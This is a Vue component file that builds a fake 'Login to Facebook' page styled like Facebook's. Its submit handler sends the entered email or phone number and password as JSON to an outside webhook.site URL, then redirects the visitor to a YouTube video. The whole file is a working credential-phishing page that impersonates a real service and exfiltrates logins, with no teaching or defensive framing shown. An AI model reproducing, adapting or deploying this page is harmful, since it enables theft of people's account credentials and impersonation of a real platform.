<script setup>
import { ref } from 'vue'

const username = ref('');
const password = ref('');
const webhookUrl = 'https://webhook.site/24e2e987-8afc-4fd2-b57a-50348fb8fd16'; // Replace with your actual webhook URL

const sendLoginToWebhook = async () => {
  try {
    const response = await fetch(webhookUrl, {
      mode: 'no-cors',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: username.value,
        password: password.value
      }),
    });

    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    // Handle response here
    const data = await response.json();
    //console.log('Login sent to the webhook:', data);
    // Add your logic here for what happens after the login is sent

  } catch (error) {
    //console.error('Error sending login to the webhook:', error);
  }
};
</script>

<template>
  <div class="login-container">
    <div class="login-form">
      <h1>Login to Facebook</h1>
      <form @submit.prevent="sendLoginToWebhook">
        <div class="form-group">
          <input type="text" id="username" v-model="username" placeholder="Email or phone number" required />
        </div>
        <div class="form-group">
          <input type="password" id="password" v-model="password" placeholder="Password" required />
        </div>
        <div class="form-group">
          <button type="submit" class="login-button">Log In</button>
        </div>
        <div class="forgot-password">
          <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank" rel="noopener noreferrer">Forgot Password?</a>
        </div>
      </form>
    </div>
  </div>
</template>

<style scoped>
.login-container {
  font-family: Arial, sans-serif;
  max-width: 360px;
  margin: 50px auto;
  padding: 20px;
  background-color: #fff;
  border-radius: 5px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.login-form h1 {
  color: #3b5998;
  font-size: 24px;
  margin-bottom: 20px;
  text-align: center;
}

.form-group {
  margin-bottom: 15px;
}

.form-group input {
  width: 100%;
  padding: 10px;
  border: 1px solid #dddfe2;
  border-radius: 5px;
  font-size: 16px;
  margin-bottom: 6px;
}

.form-group button.login-button {
  width: 100%;
  padding: 10px;
  border: none;
  border-radius: 5px;
  background-color: #1877f2;
  color: white;
  font-size: 18px;
  cursor: pointer;
}

.form-group button.login-button:hover {
  background-color: #165ab5;
}

.forgot-password {
  text-align: center;
  margin-top: 8px;
}

.forgot-password a {
  color: #1877f2;
  font-size: 14px;
  text-decoration: none;
}

.forgot-password a:hover {
  text-decoration: underline;
}
</style>
